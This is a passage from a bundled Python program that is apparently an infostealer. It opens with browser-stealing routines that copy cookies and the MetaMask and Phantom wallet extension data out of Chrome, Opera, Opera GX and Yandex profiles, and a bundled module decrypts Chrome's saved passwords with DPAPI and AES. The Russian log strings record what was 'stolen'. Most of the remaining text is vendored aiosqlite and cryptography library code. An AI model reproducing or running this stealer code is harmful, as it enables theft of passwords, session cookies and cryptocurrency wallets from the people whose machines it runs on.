cookies_path = join(self.conf.log_path, 'cookies')\r\n                path = join(cookies_path, name)\r\n                \r\n                if not isdir(cookies_path):\r\n                    mkdir(cookies_path)\r\n\r\n                async with open(path, 'w', encoding='utf8') as f:\r\n                    await f.write(cookies)\r\n            \r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd\xd1\x8b \xd0\xba\xd1\x83\xd0\xba\xd0\xb8 \xd1\x81 {root_path}')\r\n        except Exception as e:\r\n            await self.conf.logger.log(f'Error in steal_cookies: {e}')\r\n\r\n\r\n    async def steal_wallets(self, root_path: str) -> None:\r\n        try:\r\n            if not isdir(root_path):\r\n                return []\r\n\r\n            wallet_folder_paths = {\r\n                join(root_path, 'user data', 'default', 'local extension settings'), \r\n                join(root_path, 'user data', 'local extension settings'), \r\n                join(root_path, 'local extension settings')\r\n            }\r\n\r\n            wallets = {\r\n                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'metamask',\r\n                'bfnaelmomeimhlpmgjnjophhpkkoljpa': 'phantom'\r\n            }\r\n\r\n            async for p in search_paths(wallet_folder_paths, set(wallets.keys())):\r\n                if not isdir(p):\r\n                    continue\r\n                \r\n                wallets_path = join(self.conf.log_path, 'wallets')\r\n                if not isdir(wallets_path):\r\n                    mkdir(wallets_path)\r\n\r\n                name = split(p)[1]\r\n                wallet_name = wallets[name]\r\n                dest_path = join(wallets_path, f'{wallet_name}_{token_hex(4)}')\r\n\r\n                try:\r\n                    await copytree(p, dest_path)\r\n                except Exception as e:\r\n                    pass\r\n\r\n                await self.conf.logger.log(f'\xd0\xa1\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb6\xd0\xb5\xd0\xbd \xd0\xb2\xd0\xb5\xd0\xb1 \xd0\xba\xd0\xbe\xd1\x88\xd0\xb5\xd0\xbb\xd1\x8c \xd1\x81 {p}')\r\n        except Exception as e:\r\n            await self.conf.logger.log(f'\xd0\x9e\xd1\x88\xd0\xb8\xd0\xb1\xd0\xba\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb8 \xd0\xbf\xd0\xbe\xd0\xbf\xd1\x8b\xd1\x82\xd0\xba\xd0\xb5 \xd1\x81\xd0\xbf\xd0\xb8\xd0\xb7\xd0\xb4\xd0\xb8\xd1\x82\xd1\x8c \xd0\xb2\xd0\xb5\xd0\xb1 \xd0\xba\xd0\xbe\xd1\x88\xd0\xb5\xd0\xbb\xd0\xb5\xd0\xba {root_path}')\r\n    \r\n\r\n    async def callback(self, path: str) -> None:\r\n        chromium_browser_names = {\r\n            'opera gx stable',\r\n            'opera stable',\r\n            'chrome',\r\n            'yandexbrowser'\r\n        }\r\n\r\n        tasks: List[Task] = []\r\n\r\n        for folder_name in chromium_browser_names.intersection(i.name.lower() for i in scandir(path)):\r\n            root_path = join(path, folder_name)\r\n            tasks.append(create_task(self.steal_password(root_path)))\r\n            tasks.append(create_task(self.steal_cookies(root_path)))\r\n            tasks.append(create_task(self.steal_wallets(root_path)))\r\n\r\n        for task in tasks:\r\n            task.add_done_callback(lambda x: _handle_task_result(x, self.conf.logger))\r\n            \r\n        for task in tasks:\r\n            try:\r\n                await task\r\n            except Exception as e:\r\n                await self.conf.logger.log(f'Error in chromium tasks: {e}')\r\n                ")
    __stickytape_write_module('aiosqlite/__init__.py', b'# Copyright 2018 John Reese\n# Licensed under the MIT license\n\n"""asyncio bridge to the standard sqlite3 module"""\n\nfrom sqlite3 import (  # pylint: disable=redefined-builtin\n    DatabaseError,\n    Error,\n    IntegrityError,\n    NotSupportedError,\n    OperationalError,\n    ProgrammingError,\n    Row,\n    Warning,\n    register_adapter,\n    register_converter,\n    sqlite_version,\n    sqlite_version_info,\n)\n\n__author__ = "John Reese"\nfrom .__version__ import __version__\nfrom .core import Connection, Cursor, connect\n\n__all__ = [\n    "__version__",\n    "register_adapter",\n    "register_converter",\n    "sqlite_version",\n    "sqlite_version_info",\n    "connect",\n    "Connection",\n    "Cursor",\n    "Row",\n    "Warning",\n    "Error",\n    "DatabaseError",\n    "IntegrityError",\n    "ProgrammingError",\n    "OperationalError",\n    "NotSupportedError",\n]\n')
    __stickytape_write_module('aiosqlite/__version__.py', b'__version__ = "0.17.0"\n')
    __stickytape_write_module('aiosqlite/core.py', b'# Copyright 2018 John Reese\n# Licensed under the MIT license\n\n"""\nCore implementation of aiosqlite proxies\n"""\n\nimport asyncio\nimport logging\nimport sqlite3\nimport sys\nimport warnings\nfrom functools import partial\nfrom pathlib import Path\nfrom queue import Empty, Queue\nfrom threading import Thread\nfrom typing import (\n    Any,\n    AsyncIterator,\n    Callable,\n    Generator,\n    Iterable,\n    Optional,\n    Type,\n    Union,\n)\nfrom warnings import warn\n\nfrom .context import contextmanager\nfrom .cursor import Cursor\n\n__all__ = ["connect", "Connection", "Cursor"]\n\nLOG = logging.getLogger("aiosqlite")\n\n\ndef get_loop(future: asyncio.Future) -> asyncio.AbstractEventLoop:\n    if sys.version_info >= (3, 7):\n        return future.get_loop()\n    else:\n        return future._loop\n\n\nclass Connection(Thread):\n    def __init__(\n        self,\n        connector: Callable[[], sqlite3.Connection],\n        iter_chunk_size: int,\n        loop: Optional[asyncio.AbstractEventLoop] = None,\n    ) -> None:\n        super().__init__()\n        self._running = True\n        self._connection: Optional[sqlite3.Connection] = None\n        self._connector = connector\n        self._tx: Queue = Queue()\n        self._iter_chunk_size = iter_chunk_size\n\n        if loop is not None:\n            warn(\n                "aiosqlite.Connection no longer uses the `loop` parameter",\n                DeprecationWarning,\n            )\n\n    @property\n    def _conn(self) -> sqlite3.Connection:\n        if self._connection is None:\n            raise ValueError("no active connection")\n\n        return self._connection\n\n    def _execute_insert(\n        self, sql: str, parameters: Iterable[Any]\n    ) -> Optional[sqlite3.Row]:\n        cursor = self._conn.execute(sql, parameters)\n        cursor.execute("SELECT last_insert_rowid()")\n        return cursor.fetchone()\n\n    def _execute_fetchall(\n        self, sql: str, parameters: Iterable[Any]\n    ) -> Iterable[sqlite3.Row]:\n        cursor = self._conn.execute(sql, parameters)\n        return cursor.fetchall()\n\n    def run(self) -> None:\n        """\n        Execute function calls on a separate thread.\n\n        :meta private:\n        """\n        while True:\n            # Continues running until all queue items are processed,\n            # even after connection is closed (so we can finalize all\n            # futures)\n            try:\n                future, function = self._tx.get(timeout=0.1)\n            except Empty:\n                if self._running:\n                    continue\n                break\n            try:\n                LOG.debug("executing %s", function)\n                result = function()\n                LOG.debug("operation %s completed", function)\n\n                def set_result(fut, result):\n                    if not fut.done():\n                        fut.set_result(result)\n\n                get_loop(future).call_soon_threadsafe(set_result, future, result)\n            except BaseException as e:\n                LOG.debug("returning exception %s", e)\n\n                def set_exception(fut, e):\n                    if not fut.done():\n                        fut.set_exception(e)\n\n                get_loop(future).call_soon_threadsafe(set_exception, future, e)\n\n    async def _execute(self, fn, *args, **kwargs):\n        """Queue a function with the given arguments for execution."""\n        if not self._running or not self._connection:\n            raise ValueError("Connection closed")\n\n        function = partial(fn, *args, **kwargs)\n        future = asyncio.get_event_loop().create_future()\n\n        self._tx.put_nowait((future, function))\n\n        return await future\n\n    async def _connect(self) -> "Connection":\n        """Connect to the actual sqlite database."""\n        if self._connection is None:\n            try:\n                future = asyncio.get_event_loop().create_future()\n                self._tx.put_nowait((future, self._connector))\n                self._connection = await future\n            except Exception:\n                self._running = False\n                self._connection = None\n                raise\n\n        return self\n\n    def __await__(self) -> Generator[Any, None, "Connection"]:\n        self.start()\n        return self._connect().__await__()\n\n    async def __aenter__(self) -> "Connection":\n        return await self\n\n    async def __aexit__(self, exc_type, exc_val, exc_tb) -> None:\n        await self.close()\n\n    @contextmanager\n    async def cursor(self) -> Cursor:\n        """Create an aiosqlite cursor wrapping a sqlite3 cursor object."""\n        return Cursor(self, await self._execute(self._conn.cursor))\n\n    async def commit(self) -> None:\n        """Commit the current transaction."""\n        await self._execute(self._conn.commit)\n\n    async def rollback(self) -> None:\n        """Roll back the current transaction."""\n        await self._execute(self._conn.rollback)\n\n    async def close(self) -> None:\n        """Complete queued queries/cursors and close the connection."""\n        try:\n            await self._execute(self._conn.close)\n        except Exception:\n            LOG.info("exception occurred while closing connection")\n            raise\n        finally:\n            self._running = False\n            self._connection = None\n\n    @contextmanager\n    async def execute(self, sql: str, parameters: Iterable[Any] = None) -> Cursor:\n        """Helper to create a cursor and execute the given query."""\n        if parameters is None:\n            parameters = []\n        cursor = await self._execute(self._conn.execute, sql, parameters)\n        return Cursor(self, cursor)\n\n    @contextmanager\n    async def execute_insert(\n        self, sql: str, parameters: Iterable[Any] = None\n    ) -> Optional[sqlite3.Row]:\n        """Helper to insert and get the last_insert_rowid."""\n        if parameters is None:\n            parameters = []\n        return await self._execute(self._execute_insert, sql, parameters)\n\n    @contextmanager\n    async def execute_fetchall(\n        self, sql: str, parameters: Iterable[Any] = None\n    ) -> Iterable[sqlite3.Row]:\n        """Helper to execute a query and return all the data."""\n        if parameters is None:\n            parameters = []\n        return await self._execute(self._execute_fetchall, sql, parameters)\n\n    @contextmanager\n    async def executemany(\n        self, sql: str, parameters: Iterable[Iterable[Any]]\n    ) -> Cursor:\n        """Helper to create a cursor and execute the given multiquery."""\n        cursor = await self._execute(self._conn.executemany, sql, parameters)\n        return Cursor(self, cursor)\n\n    @contextmanager\n    async def executescript(self, sql_script: str) -> Cursor:\n        """Helper to create a cursor and execute a user script."""\n        cursor = await self._execute(self._conn.executescript, sql_script)\n        return Cursor(self, cursor)\n\n    async def interrupt(self) -> None:\n        """Interrupt pending queries."""\n        return self._conn.interrupt()\n\n    async def create_function(\n        self, name: str, num_params: int, func: Callable, deterministic: bool = False\n    ) -> None:\n        """\n        Create user-defined function that can be later used\n        within SQL statements. Must be run within the same thread\n        that query executions take place so instead of executing directly\n        against the connection, we defer this to `run` function.\n\n        In Python 3.8 and above, if *deterministic* is true, the created\n        function is marked as deterministic, which allows SQLite to perform\n        additional optimizations. This flag is supported by SQLite 3.8.3 or\n        higher, ``NotSupportedError`` will be raised if used with older\n        versions.\n        """\n        if sys.version_info >= (3, 8):\n            await self._execute(\n                self._conn.create_function,\n                name,\n                num_params,\n                func,\n                deterministic=deterministic,\n            )\n        else:\n            if deterministic:\n                warnings.warn(\n                    "Deterministic function support is only available on "\n                    \'Python 3.8+. Function "{}" will be registered as \'\n                    "non-deterministic as per SQLite defaults.".format(name)\n                )\n\n            await self._execute(self._conn.create_function, name, num_params, func)\n\n    @property\n    def in_transaction(self) -> bool:\n        return self._conn.in_transaction\n\n    @property\n    def isolation_level(self) -> str:\n        return self._conn.isolation_level\n\n    @isolation_level.setter\n    def isolation_level(self, value: str) -> None:\n        self._conn.isolation_level = value\n\n    @property\n    def row_factory(self) -> "Optional[Type]":  # py3.5.2 compat (#24)\n        return self._conn.row_factory\n\n    @row_factory.setter\n    def row_factory(self, factory: "Optional[Type]") -> None:  # py3.5.2 compat (#24)\n        self._conn.row_factory = factory\n\n    @property\n    def text_factory(self) -> Type:\n        return self._conn.text_factory\n\n    @text_factory.setter\n    def text_factory(self, factory: Type) -> None:\n        self._conn.text_factory = factory\n\n    @property\n    def total_changes(self) -> int:\n        return self._conn.total_changes\n\n    async def enable_load_extension(self, value: bool) -> None:\n        await self._execute(self._conn.enable_load_extension, value)  # type: ignore\n\n    async def load_extension(self, path: str):\n        await self._execute(self._conn.load_extension, path)  # type: ignore\n\n    async def set_progress_handler(\n        self, handler: Callable[[], Optional[int]], n: int\n    ) -> None:\n        await self._execute(self._conn.set_progress_handler, handler, n)\n\n    async def set_trace_callback(self, handler: Callable) -> None:\n        await self._execute(self._conn.set_trace_callback, handler)\n\n    async def iterdump(self) -> AsyncIterator[str]:\n        """\n        Return an async iterator to dump the database in SQL text format.\n\n        Example::\n\n            async for line in db.iterdump():\n                ...\n\n        """\n        dump_queue: Queue = Queue()\n\n        def dumper():\n            try:\n                for line in self._conn.iterdump():\n                    dump_queue.put_nowait(line)\n                dump_queue.put_nowait(None)\n\n            except Exception:\n                LOG.exception("exception while dumping db")\n                dump_queue.put_nowait(None)\n                raise\n\n        fut = self._execute(dumper)\n        task = asyncio.ensure_future(fut)\n\n        while True:\n            try:\n                line: Optional[str] = dump_queue.get_nowait()\n                if line is None:\n                    break\n                yield line\n\n            except Empty:\n                if task.done():\n                    LOG.warning("iterdump completed unexpectedly")\n                    break\n\n                await asyncio.sleep(0.01)\n\n        await task\n\n    async def backup(\n        self,\n        target: Union["Connection", sqlite3.Connection],\n        *,\n        pages: int = 0,\n        progress: Optional[Callable[[int, int, int], None]] = None,\n        name: str = "main",\n        sleep: float = 0.250\n    ) -> None:\n        """\n        Make a backup of the current database to the target database.\n\n        Takes either a standard sqlite3 or aiosqlite Connection object as the target.\n        """\n        if sys.version_info < (3, 7):\n            raise RuntimeError("backup() method is only available on Python 3.7+")\n\n        if isinstance(target, Connection):\n            target = target._conn\n\n        await self._execute(\n            self._conn.backup,\n            target,\n            pages=pages,\n            progress=progress,\n            name=name,\n            sleep=sleep,\n        )\n\n\ndef connect(\n    database: Union[str, Path],\n    *,\n    iter_chunk_size=64,\n    loop: Optional[asyncio.AbstractEventLoop] = None,\n    **kwargs: Any\n) -> Connection:\n    """Create and return a connection proxy to the sqlite database."""\n\n    if loop is not None:\n        warn(\n            "aiosqlite.connect() no longer uses the `loop` parameter",\n            DeprecationWarning,\n        )\n\n    def connector() -> sqlite3.Connection:\n        if isinstance(database, str):\n            loc = database\n        elif isinstance(database, bytes):\n            loc = database.decode("utf-8")\n        else:\n            loc = str(database)\n\n        return sqlite3.connect(loc, **kwargs)\n\n    return Connection(connector, iter_chunk_size)\n')
    __stickytape_write_module('aiosqlite/context.py', b'# Copyright 2018\n# Licensed under the MIT license\n\n\nfrom functools import wraps\nfrom typing import Any, Callable, Coroutine, Generator, TypeVar\n\nfrom typing_extensions import AsyncContextManager\n\nfrom .cursor import Cursor\n\n_T = TypeVar("_T")\n\n\nclass Result(AsyncContextManager[_T], Coroutine[Any, Any, _T]):\n    __slots__ = ("_coro", "_obj")\n\n    def __init__(self, coro: Coroutine[Any, Any, _T]):\n        self._coro = coro\n        self._obj: _T\n\n    def send(self, value) -> None:\n        return self._coro.send(value)\n\n    def throw(self, typ, val=None, tb=None) -> None:\n        if val is None:\n            return self._coro.throw(typ)\n\n        if tb is None:\n            return self._coro.throw(typ, val)\n\n        return self._coro.throw(typ, val, tb)\n\n    def close(self) -> None:\n        return self._coro.close()\n\n    def __await__(self) -> Generator[Any, None, _T]:\n        return self._coro.__await__()\n\n    async def __aenter__(self) -> _T:\n        self._obj = await self._coro\n        return self._obj\n\n    async def __aexit__(self, exc_type, exc, tb) -> None:\n        if isinstance(self._obj, Cursor):\n            await self._obj.close()\n\n\ndef contextmanager(\n    method: Callable[..., Coroutine[Any, Any, _T]]\n) -> Callable[..., Result[_T]]:\n    @wraps(method)\n    def wrapper(self, *args, **kwargs) -> Result[_T]:\n        return Result(method(self, *args, **kwargs))\n\n    return wrapper\n')
    __stickytape_write_module('aiosqlite/cursor.py', b'# Copyright 2018 John Reese\n# Licensed under the MIT license\n\nimport sqlite3\nfrom typing import TYPE_CHECKING, Any, AsyncIterator, Iterable, Optional, Tuple\n\nif TYPE_CHECKING:\n    from .core import Connection\n\n\nclass Cursor:\n    def __init__(self, conn: "Connection", cursor: sqlite3.Cursor) -> None:\n        self.iter_chunk_size = conn._iter_chunk_size\n        self._conn = conn\n        self._cursor = cursor\n\n    def __aiter__(self) -> AsyncIterator[sqlite3.Row]:\n        """The cursor proxy is also an async iterator."""\n        return self._fetch_chunked()\n\n    async def _fetch_chunked(self):\n        while True:\n            rows = await self.fetchmany(self.iter_chunk_size)\n            if not rows:\n                return\n            for row in rows:\n                yield row\n\n    async def _execute(self, fn, *args, **kwargs):\n        """Execute the given function on the shared connection\'s thread."""\n        return await self._conn._execute(fn, *args, **kwargs)\n\n    async def execute(self, sql: str, parameters: Iterable[Any] = None) -> "Cursor":\n        """Execute the given query."""\n        if parameters is None:\n            parameters = []\n        await self._execute(self._cursor.execute, sql, parameters)\n        return self\n\n    async def executemany(\n        self, sql: str, parameters: Iterable[Iterable[Any]]\n    ) -> "Cursor":\n        """Execute the given multiquery."""\n        await self._execute(self._cursor.executemany, sql, parameters)\n        return self\n\n    async def executescript(self, sql_script: str) -> "Cursor":\n        """Execute a user script."""\n        await self._execute(self._cursor.executescript, sql_script)\n        return self\n\n    async def fetchone(self) -> Optional[sqlite3.Row]:\n        """Fetch a single row."""\n        return await self._execute(self._cursor.fetchone)\n\n    async def fetchmany(self, size: int = None) -> Iterable[sqlite3.Row]:\n        """Fetch up to `cursor.arraysize` number of rows."""\n        args: Tuple[int, ...] = ()\n        if size is not None:\n            args = (size,)\n        return await self._execute(self._cursor.fetchmany, *args)\n\n    async def fetchall(self) -> Iterable[sqlite3.Row]:\n        """Fetch all remaining rows."""\n        return await self._execute(self._cursor.fetchall)\n\n    async def close(self) -> None:\n        """Close the cursor."""\n        await self._execute(self._cursor.close)\n\n    @property\n    def rowcount(self) -> int:\n        return self._cursor.rowcount\n\n    @property\n    def lastrowid(self) -> int:\n        return self._cursor.lastrowid\n\n    @property\n    def arraysize(self) -> int:\n        return self._cursor.arraysize\n\n    @arraysize.setter\n    def arraysize(self, value: int) -> None:\n        self._cursor.arraysize = value\n\n    @property\n    def description(self) -> Tuple[Tuple]:\n        return self._cursor.description\n\n    @property\n    def connection(self) -> sqlite3.Connection:\n        return self._cursor.connection\n\n    async def __aenter__(self):\n        return self\n\n    async def __aexit__(self, exc_type, exc_val, exc_tb):\n        await self.close()\n')
    __stickytape_write_module('plugins/browsers/decrypt.py', b'# https://github.com/hakanonymos/steal-chrome-password-all-version/blob/master/local.py\r\n\r\n\r\nimport ctypes\r\nimport ctypes.wintypes\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives.ciphers import (\r\n    Cipher, algorithms, modes)\r\nimport base64\r\nimport os\r\nimport json\r\n\r\n\r\nclass Decryptor:\r\n    def __init__(self, path) -> None:\r\n        if path is None:\r\n            self.path = os.path.join(os.environ[\'LOCALAPPDATA\'], r"Google\\Chrome\\User Data\\Local State")\r\n        else:\r\n            self.path = path\r\n        \r\n        self.key = None\r\n        self.cipher = None\r\n\r\n    @staticmethod\r\n    def dpapi_decrypt(encrypted):\r\n        class DATA_BLOB(ctypes.Structure):\r\n            _fields_ = [(\'cbData\', ctypes.wintypes.DWORD),\r\n                        (\'pbData\', ctypes.POINTER(ctypes.c_char))]\r\n\r\n        p = ctypes.create_string_buffer(encrypted, len(encrypted))\r\n        blobin = DATA_BLOB(ctypes.sizeof(p), p)\r\n        blobout = DATA_BLOB()\r\n        retval = ctypes.windll.crypt32.CryptUnprotectData(\r\n            ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))\r\n        if not retval:\r\n            raise ctypes.WinError()\r\n        result = ctypes.string_at(blobout.pbData, blobout.cbData)\r\n        ctypes.windll.kernel32.LocalFree(blobout.pbData)\r\n        return result\r\n\r\n    @staticmethod\r\n    def decrypt(cipher, ciphertext, nonce):\r\n        cipher.mode = modes.GCM(nonce)\r\n        decryptor = cipher.decryptor()\r\n        return decryptor.update(ciphertext)\r\n\r\n    def get_key_from_local_state(self):\r\n        jsn = None\r\n        with open(self.path, \'r\') as f:\r\n            jsn = json.loads(str(f.readline()))\r\n        return jsn[\'os_crypt\'][\'encrypted_key\']\r\n\r\n    @staticmethod\r\n    def get_cipher(key):\r\n        cipher = Cipher(\r\n            algorithms.AES(key),\r\n            None,\r\n            backend=default_backend()\r\n        )\r\n        return cipher\r\n\r\n    def aes_decrypt(self, encrypted_txt):\r\n        if self.key is None:\r\n            encoded_key = self.get_key_from_local_state()\r\n            encrypted_key = base64.b64decode(encoded_key.encode())\r\n            encrypted_key = encrypted_key[5:]\r\n            self.key = Decryptor.dpapi_decrypt(encrypted_key)\r\n            self.cipher = Decryptor.get_cipher(self.key)\r\n        \r\n        nonce = encrypted_txt[3:15]\r\n\r\n        return Decryptor.decrypt(self.cipher,encrypted_txt[15:],nonce)\r\n\r\n    def decrypt_password(self, data):\r\n        try:\r\n            if data[:4] == b\'\\x01\\x00\\x00\\x00\':\r\n                decrypted = Decryptor.dpapi_decrypt(data)\r\n                return decrypted.decode()\r\n            elif data[:3] == b\'v10\':\r\n                decrypted = self.aes_decrypt(data)\r\n                return decrypted[:-16].decode()\r\n        except:\r\n            return None')
    __stickytape_write_module('cryptography/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport sys\r\nimport warnings\r\n\r\nfrom cryptography.__about__ import (\r\n    __author__,\r\n    __copyright__,\r\n    __version__,\r\n)\r\nfrom cryptography.utils import CryptographyDeprecationWarning\r\n\r\n\r\n__all__ = [\r\n    "__version__",\r\n    "__author__",\r\n    "__copyright__",\r\n]\r\n\r\nif sys.version_info[:2] == (3, 6):\r\n    warnings.warn(\r\n        "Python 3.6 is no longer supported by the Python core team. "\r\n        "Therefore, support for it is deprecated in cryptography and will be"\r\n        " removed in a future release.",\r\n        CryptographyDeprecationWarning,\r\n        stacklevel=2,\r\n    )\r\n')
    __stickytape_write_module('cryptography/__about__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\n__all__ = [\r\n    "__version__",\r\n    "__author__",\r\n    "__copyright__",\r\n]\r\n\r\n__version__ = "37.0.2"\r\n\r\n__author__ = "The Python Cryptographic Authority and individual contributors"\r\n__copyright__ = "Copyright 2013-2021 {}".format(__author__)\r\n')
    __stickytape_write_module('cryptography/utils.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport enum\r\nimport inspect\r\nimport sys\r\nimport types\r\nimport typing\r\nimport warnings\r\n\r\n\r\n# We use a UserWarning subclass, instead of DeprecationWarning, because CPython\r\n# decided deprecation warnings should be invisble by default.\r\nclass CryptographyDeprecationWarning(UserWarning):\r\n    pass\r\n\r\n\r\n# Several APIs were deprecated with no specific end-of-life date because of the\r\n# ubiquity of their use. They should not be removed until we agree on when that\r\n# cycle ends.\r\nPersistentlyDeprecated2019 = CryptographyDeprecationWarning\r\nDeprecatedIn35 = CryptographyDeprecationWarning\r\nDeprecatedIn36 = CryptographyDeprecationWarning\r\nDeprecatedIn37 = CryptographyDeprecationWarning\r\n\r\n\r\ndef _check_bytes(name: str, value: bytes) -> None:\r\n    if not isinstance(value, bytes):\r\n        raise TypeError("{} must be bytes".format(name))\r\n\r\n\r\ndef _check_byteslike(name: str, value: bytes) -> None:\r\n    try:\r\n        memoryview(value)\r\n    except TypeError:\r\n        raise TypeError("{} must be bytes-like".format(name))\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from typing_extensions import Protocol\r\n\r\n    _T_class = typing.TypeVar("_T_class", bound=type)\r\n\r\n    class _RegisterDecoratorType(Protocol):\r\n        def __call__(\r\n            self, klass: _T_class, *, check_annotations: bool = False\r\n        ) -> _T_class:\r\n            ...\r\n\r\n\r\ndef register_interface(iface: abc.ABCMeta) -> "_RegisterDecoratorType":\r\n    def register_decorator(\r\n        klass: "_T_class", *, check_annotations: bool = False\r\n    ) -> "_T_class":\r\n        verify_interface(iface, klass, check_annotations=check_annotations)\r\n        iface.register(klass)\r\n        return klass\r\n\r\n    return register_decorator\r\n\r\n\r\ndef int_to_bytes(integer: int, length: typing.Optional[int] = None) -> bytes:\r\n    return integer.to_bytes(\r\n        length or (integer.bit_length() + 7) // 8 or 1, "big"\r\n    )\r\n\r\n\r\nclass InterfaceNotImplemented(Exception):\r\n    pass\r\n\r\n\r\ndef strip_annotation(signature: inspect.Signature) -> inspect.Signature:\r\n    return inspect.Signature(\r\n        [\r\n            param.replace(annotation=inspect.Parameter.empty)\r\n            for param in signature.parameters.values()\r\n        ]\r\n    )\r\n\r\n\r\ndef verify_interface(\r\n    iface: abc.ABCMeta, klass: object, *, check_annotations: bool = False\r\n):\r\n    for method in iface.__abstractmethods__:\r\n        if not hasattr(klass, method):\r\n            raise InterfaceNotImplemented(\r\n                "{} is missing a {!r} method".format(klass, method)\r\n            )\r\n        if isinstance(getattr(iface, method), abc.abstractproperty):\r\n            # Can\'t properly verify these yet.\r\n            continue\r\n        sig = inspect.signature(getattr(iface, method))\r\n        actual = inspect.signature(getattr(klass, method))\r\n        if check_annotations:\r\n            ok = sig == actual\r\n        else:\r\n            ok = strip_annotation(sig) == strip_annotation(actual)\r\n        if not ok:\r\n            raise InterfaceNotImplemented(\r\n                "{}.{}\'s signature differs from the expected. Expected: "\r\n                "{!r}. Received: {!r}".format(klass, method, sig, actual)\r\n            )\r\n\r\n\r\nclass _DeprecatedValue:\r\n    def __init__(self, value: object, message: str, warning_class):\r\n        self.value = value\r\n        self.message = message\r\n        self.warning_class = warning_class\r\n\r\n\r\nclass _ModuleWithDeprecations(types.ModuleType):\r\n    def __init__(self, module: types.ModuleType):\r\n        super().__init__(module.__name__)\r\n        self.__dict__["_module"] = module\r\n\r\n    def __getattr__(self, attr: str) -> object:\r\n        obj = getattr(self._module, attr)\r\n        if isinstance(obj, _DeprecatedValue):\r\n            warnings.warn(obj.message, obj.warning_class, stacklevel=2)\r\n            obj = obj.value\r\n        return obj\r\n\r\n    def __setattr__(self, attr: str, value: object) -> None:\r\n        setattr(self._module, attr, value)\r\n\r\n    def __delattr__(self, attr: str) -> None:\r\n        obj = getattr(self._module, attr)\r\n        if isinstance(obj, _DeprecatedValue):\r\n            warnings.warn(obj.message, obj.warning_class, stacklevel=2)\r\n\r\n        delattr(self._module, attr)\r\n\r\n    def __dir__(self) -> typing.Sequence[str]:\r\n        return ["_module"] + dir(self._module)\r\n\r\n\r\ndef deprecated(\r\n    value: object,\r\n    module_name: str,\r\n    message: str,\r\n    warning_class: typing.Type[Warning],\r\n    name: typing.Optional[str] = None,\r\n) -> _DeprecatedValue:\r\n    module = sys.modules[module_name]\r\n    if not isinstance(module, _ModuleWithDeprecations):\r\n        sys.modules[module_name] = module = _ModuleWithDeprecations(module)\r\n    dv = _DeprecatedValue(value, message, warning_class)\r\n    # Maintain backwards compatibility with `name is None` for pyOpenSSL.\r\n    if name is not None:\r\n        setattr(module, name, dv)\r\n    return dv\r\n\r\n\r\ndef cached_property(func: typing.Callable) -> property:\r\n    cached_name = "_cached_{}".format(func)\r\n    sentinel = object()\r\n\r\n    def inner(instance: object):\r\n        cache = getattr(instance, cached_name, sentinel)\r\n        if cache is not sentinel:\r\n            return cache\r\n        result = func(instance)\r\n        setattr(instance, cached_name, result)\r\n        return result\r\n\r\n    return property(inner)\r\n\r\n\r\n# Python 3.10 changed representation of enums. We use well-defined object\r\n# representation and string representation from Python 3.9.\r\nclass Enum(enum.Enum):\r\n    def __repr__(self) -> str:\r\n        return f"<{self.__class__.__name__}.{self._name_}: {self._value_!r}>"\r\n\r\n    def __str__(self) -> str:\r\n        return f"{self.__class__.__name__}.{self._name_}"\r\n')
    __stickytape_write_module('cryptography/hazmat/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n"""\r\nHazardous Materials\r\n\r\nThis is a "Hazardous Materials" module. You should ONLY use it if you\'re\r\n100% absolutely sure that you know what you\'re doing because this module\r\nis full of land mines, dragons, and dinosaurs with laser guns.\r\n"""\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\nfrom typing import Any\r\n\r\n\r\ndef default_backend() -> Any:\r\n    from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n    return backend\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nfrom cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n\r\n__all__ = ["backend"]\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/backend.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport collections\r\nimport contextlib\r\nimport itertools\r\nimport typing\r\nimport warnings\r\nfrom contextlib import contextmanager\r\n\r\nfrom cryptography import utils, x509\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.backends.openssl import aead\r\nfrom cryptography.hazmat.backends.openssl.ciphers import _CipherContext\r\nfrom cryptography.hazmat.backends.openssl.cmac import _CMACContext\r\nfrom cryptography.hazmat.backends.openssl.dh import (\r\n    _DHParameters,\r\n    _DHPrivateKey,\r\n    _DHPublicKey,\r\n    _dh_params_dup,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.dsa import (\r\n    _DSAParameters,\r\n    _DSAPrivateKey,\r\n    _DSAPublicKey,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.ec import (\r\n    _EllipticCurvePrivateKey,\r\n    _EllipticCurvePublicKey,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.ed25519 import (\r\n    _Ed25519PrivateKey,\r\n    _Ed25519PublicKey,\r\n)\r\nfrom cryptography.hazmat.backends.openssl.ed448 import (\r\n    _ED448_KEY_SIZE,\r\n    _Ed448PrivateKey,\r\n    _Ed448PublicKey,\r\n)\r\nfrom 